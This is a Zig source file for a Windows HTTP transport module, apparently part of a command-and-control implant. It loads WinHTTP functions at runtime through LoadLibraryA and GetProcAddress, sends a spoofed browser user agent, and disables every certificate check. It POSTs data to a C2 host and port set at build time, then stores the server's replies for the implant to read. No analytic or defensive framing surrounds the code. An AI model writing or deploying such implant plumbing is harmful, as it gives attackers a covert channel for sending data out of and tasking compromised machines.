const std = @import("std");
const t = @import("mod.zig");
const build_options = @import("build_options");

// --- WinHttp Constants ---
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;

// --- Function Type Definitions ---
const WinHttpOpenFn              = *const fn([*c]const u16, u32, [*c]const u16, [*c]const u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpConnectFn           = *const fn(?*anyopaque, [*c]const u16, u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpOpenRequestFn       = *const fn(?*anyopaque, [*c]const u16, [*c]const u16, [*c]const u16, [*c]const u16, ?*const [*c]const u16, u32) callconv(.winapi) ?*anyopaque;
const WinHttpSendRequestFn       = *const fn(?*anyopaque, [*c]const u16, u32, ?*anyopaque, u32, u32, usize) callconv(.winapi) i32;
const WinHttpReceiveResponseFn    = *const fn(?*anyopaque, ?*anyopaque) callconv(.winapi) i32;
const WinHttpQueryDataAvailableFn = *const fn(?*anyopaque, *u32) callconv(.winapi) i32;
const WinHttpReadDataFn          = *const fn(?*anyopaque, ?*anyopaque, u32, *u32) callconv(.winapi) i32;
const WinHttpCloseHandleFn       = *const fn(?*anyopaque) callconv(.winapi) i32;
const WinHttpSetTimeoutsFn       = *const fn(?*anyopaque, i32, i32, i32, i32) callconv(.winapi) i32;
const WinHttpSetOptionFn         = *const fn(?*anyopaque, u32, ?*const anyopaque, u32) callconv(.winapi) i32;

const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x00000100;
const SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE: u32 = 0x00000200;
const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
const SECURITY_IGNORE_ALL_CERT_ERRORS: u32 = 
    SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | 
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

// --- Win32 Imports (Manual to ensure compatibility) ---
extern "kernel32" fn LoadLibraryA([*c]const u8) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn GetProcAddress(?*anyopaque, [*c]const u8) callconv(.winapi) ?*anyopaque;

pub const HttpTransport = struct {
    allocator: std.mem.Allocator,
    last_response: ?[]u8 = null,
    
    // Function pointers
    winhttp_open: WinHttpOpenFn,
    winhttp_connect: WinHttpConnectFn,
    winhttp_open_request: WinHttpOpenRequestFn,
    winhttp_send_request: WinHttpSendRequestFn,
    winhttp_receive_response: WinHttpReceiveResponseFn,
    winhttp_query_data_available: WinHttpQueryDataAvailableFn,
    winhttp_read_data: WinHttpReadDataFn,
    winhttp_set_option: WinHttpSetOptionFn,
    winhttp_set_timeouts: WinHttpSetTimeoutsFn,
    winhttp_close_handle: WinHttpCloseHandleFn,

    pub fn init(allocator: std.mem.Allocator) !*HttpTransport {
        const self = try allocator.create(HttpTransport);
        
        const hWinHttp = LoadLibraryA("winhttp.dll") orelse return error.WinHttpLoadFailed;
        
        self.winhttp_open = @ptrCast(GetProcAddress(hWinHttp, "WinHttpOpen") orelse return error.SymbolNotFound);
        self.winhttp_connect = @ptrCast(GetProcAddress(hWinHttp, "WinHttpConnect") orelse return error.SymbolNotFound);
        self.winhttp_open_request = @ptrCast(GetProcAddress(hWinHttp, "WinHttpOpenRequest") orelse return error.SymbolNotFound);
        self.winhttp_send_request = @ptrCast(GetProcAddress(hWinHttp, "WinHttpSendRequest") orelse return error.SymbolNotFound);
        self.winhttp_receive_response = @ptrCast(GetProcAddress(hWinHttp, "WinHttpReceiveResponse") orelse return error.SymbolNotFound);
        self.winhttp_query_data_available = @ptrCast(GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable") orelse return error.SymbolNotFound);
        self.winhttp_read_data = @ptrCast(GetProcAddress(hWinHttp, "WinHttpReadData") orelse return error.SymbolNotFound);
        self.winhttp_set_option = @ptrCast(GetProcAddress(hWinHttp, "WinHttpSetOption") orelse return error.SymbolNotFound);
        self.winhttp_set_timeouts = @ptrCast(GetProcAddress(hWinHttp, "WinHttpSetTimeouts") orelse return error.SymbolNotFound);
        self.winhttp_close_handle = @ptrCast(GetProcAddress(hWinHttp, "WinHttpCloseHandle") orelse return error.SymbolNotFound);
        
        self.allocator = allocator;
        self.last_response = null;
        return self;
    }

    pub fn transport(self: *HttpTransport) t.Transport {
        return .{
            .ptr = self,
            .send_fn = send_wrapper,
            .receive_fn = receive_wrapper,
        };
    }

    fn w(comptime s: []const u8) [*c]const u16 {
        return std.unicode.utf8ToUtf16LeStringLiteral(s);
    }

    fn send_wrapper(ptr: *anyopaque, path: []const u8, data: []const u8) anyerror!void {
        const self: *HttpTransport = @ptrCast(@alignCast(ptr));
        
        const hSession = self.winhttp_open(w("Mozilla/5.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, null, null, 0) orelse return error.WinHttpOpenFailed;
        defer _ = self.winhttp_close_handle(hSession);

        // Set timeouts: 10s for resolve, connect, send, and receive
        _ = self.winhttp_set_timeouts(hSession, 10000, 10000, 10000, 10000);

        const hConnect = self.winhttp_connect(hSession, w(build_options.c2_host), build_options.c2_port, 0) orelse return error.WinHttpConnectFailed;
        defer _ = self.winhttp_close_handle(hConnect);

        const path_w = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, path);
        defer self.allocator.free(path_w);

        const secure_flag = if (std.mem.eql(u8, build_options.c2_transport, "https")) WINHTTP_FLAG_SECURE else 0;
        const hRequest = self.winhttp_open_request(hConnect, w("POST"), path_w.ptr, null, null, null, secure_flag) orelse return error.WinHttpOpenRequestFailed;
        defer _ = self.winhttp_close_handle(hRequest);

        // Ignore SSL errors for self-signed certificates
        if (secure_flag != 0) {
            var flags: u32 = SECURITY_IGNORE_ALL_CERT_ERRORS;
            _ = self.winhttp_set_option(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, @sizeOf(u32));
        }

        if (self.winhttp_send_request(hRequest, null, 0, @constCast(data.ptr), @as(u32, @intCast(data.len)), @as(u32, @intCast(data.len)), 0) == 0) {
            return error.WinHttpSendRequestFailed;
        }

        if (self.winhttp_receive_response(hRequest, null) == 0) {
            return error.WinHttpReceiveResponseFailed;
        }

        // Read response immediately and store it for receive()
        var total_response: std.ArrayListUnmanaged(u8) = .empty;
        var dwSize: u32 = 0;
        while (self.winhttp_query_data_available(hRequest, &dwSize) != 0) {
            if (dwSize == 0) break;
            
            const buf = try self.allocator.alloc(u8, dwSize);
            defer self.allocator.free(buf);
            
            var dwRead: u32 = 0;
            if (self.winhttp_read_data(hRequest, buf.ptr, dwSize, &dwRead) == 0) break;
            if (dwRead == 0) break;
            
            try total_response.appendSlice(self.allocator, buf[0..dwRead]);
        }

        if (self.last_response) |old| self.allocator.free(old);
        self.last_response = try total_response.toOwnedSlice(self.allocator);
    }

    fn receive_wrapper(ptr: *anyopaque, allocator: std.mem.Allocator) anyerror![]u8 {
        const self: *HttpTransport = @ptrCast(@alignCast(ptr));
        if (self.last_response) |data| {
            const result = try allocator.dupe(u8, data);
            self.allocator.free(data);
            self.last_response = null;
            return result;
        }
        return @as([]u8, &[_]u8{});
    }
};
